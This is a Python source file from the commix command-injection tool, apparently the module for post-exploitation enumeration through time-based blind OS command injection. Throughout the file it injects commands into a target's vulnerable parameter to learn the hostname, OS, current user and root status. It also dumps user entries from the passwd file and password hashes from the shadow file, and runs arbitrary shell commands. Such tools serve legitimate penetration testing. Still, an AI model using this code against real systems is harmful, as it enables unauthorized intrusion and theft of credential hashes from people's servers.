#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys
import time

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.injections.blind_based.techniques.time_based import tb_injector

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""

def do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell):
      
  # Hostname enumeration
  if menu.options.hostname:
    cmd = settings.HOSTNAME
    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
    shell = output 
    if shell:
      shell = "".join(str(p) for p in output)
      sys.stdout.write(colors.BOLD + "\n\n  (!) The hostname is " + colors.UNDERL + shell + colors.RESET + ".\n")
      sys.stdout.flush()
      
  # Retrieve certain system information (operating system, hardware platform)
  if menu.options.sys_info:
    cmd = settings.RECOGNISE_OS	    
    check_how_long,output =tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
    target_os = output
    if target_os:
      target_os = "".join(str(p) for p in output)
      if target_os == "Linux":
	cmd = settings.RECOGNISE_HP
	check_how_long,output =tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
	target_arch = output
	if target_arch:
	  target_arch = "".join(str(p) for p in target_arch)
	  sys.stdout.write(colors.BOLD + "\n\n  (!) The target operating system is " + colors.UNDERL + target_os + colors.RESET)
	  sys.stdout.write(colors.BOLD + " and the hardware platform is " + colors.UNDERL + target_arch + colors.RESET + ".\n")
	  sys.stdout.flush()
      else:
	sys.stdout.write(colors.BOLD + "\n  (!) The target operating system is " + colors.UNDERL + target_os + colors.RESET + ".\n")
	sys.stdout.flush()

  # The current user enumeration
  if menu.options.current_user:
    cmd = settings.CURRENT_USER
    check_how_long,output =tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
    cu_account = output
    if cu_account:
      cu_account = "".join(str(p) for p in output)
      # Check if the user have super privilleges.
      if menu.options.is_root:
	cmd = settings.ISROOT
	check_how_long,output =tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
	if shell:
	  sys.stdout.write(colors.BOLD + "\n\n  (!) The current user is " + colors.UNDERL + cu_account + colors.RESET)
	  if shell != "0":
	      sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "not" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".\n")
	      sys.stdout.flush()
	  else:
	    sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".\n")
	    sys.stdout.flush()
      else:
	sys.stdout.write(colors.BOLD + "\n\n  (!) The current user is " + colors.UNDERL + cu_account + colors.RESET + ".\n")
	sys.stdout.flush()
	
  # System users enumeration
  if menu.options.users:
    sys.stdout.write("\n(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
    sys.stdout.flush()
    cmd = settings.SYS_USERS 	    
    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
    sys_users = output
    if sys_users :
      sys_users = "".join(str(p) for p in sys_users)
      sys_users = sys_users.replace("(@)","\n")
      sys_users = sys_users.split( )
      if len(sys_users) != 0 :
	sys.stdout.write(colors.BOLD + "\n(!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + colors.RESET)
	sys.stdout.flush()
	count = 0
	for line in sys_users:
	  count = count + 1
	  fields = line.split(":")
	  # System users privileges enumeration
	  if menu.options.privileges:
	    if int(fields[1]) == 0:
	      is_privilleged = colors.RESET + " is" +  colors.BOLD + " root user "
	    elif int(fields[1]) > 0 and int(fields[1]) < 99 :
	      is_privilleged = colors.RESET + " is" +  colors.BOLD + "  system user "
	    elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
	      if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
		is_privilleged = colors.RESET + " is" +  colors.BOLD + " anonymous user "
	      elif int(fields[1]) == 60002:
		is_privilleged = colors.RESET + " is" +  colors.BOLD + " non-trusted user "
	      else:
		is_privilleged = colors.RESET + " is" +  colors.BOLD + " regular user "
	    else :
	      is_privilleged = ""
	  else :
	    is_privilleged = ""
	  print "  ("+str(count)+") '" + colors.BOLD + colors.UNDERL + fields[0]+ colors.RESET + "'" + colors.BOLD + is_privilleged + colors.RESET + "(uid=" + fields[1] + ").Home directory is in '" + colors.BOLD + fields[2]+ colors.RESET + "'." 
      else:
	print colors.BGRED + "\n(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + colors.RESET

  # System users enumeration
  if menu.options.passwords:
    sys.stdout.write("\n(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
    sys.stdout.flush()
    cmd = settings.SYS_PASSES	    
    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
    sys_passes = output
    if sys_passes :
      sys_passes = "".join(str(p) for p in sys_passes)
      sys_passes = sys_passes.replace("(@)","\n")
      sys_passes = sys_passes.split( )
      if len(sys_passes) != 0 :
	sys.stdout.write(colors.BOLD + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + colors.RESET)
	sys.stdout.flush()
	count = 0
	for line in sys_passes:
	  count = count + 1
	  fields = line.split(":")
	  if fields[1] != "*" and fields[1] != "!!" and fields[1] != "":
	    print "  ("+str(count)+") " + colors.BOLD + fields[0]+ colors.RESET + " : " + colors.BOLD + fields[1]+ colors.RESET
      else:
	print colors.BGRED + "\n(x) Error: Cannot open '" + settings.SHADOW_FILE + "'." + colors.RESET

  # Single os-shell execution
  if menu.options.os_cmd:
    cmd =  menu.options.os_cmd
    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
    shell = output
    if shell:
      if menu.options.verbose:
	print ""
      shell = "".join(str(p) for p in shell)
      print "\n\n" + colors.GREEN + colors.BOLD + output + colors.RESET
      sys.exit(0)

# eof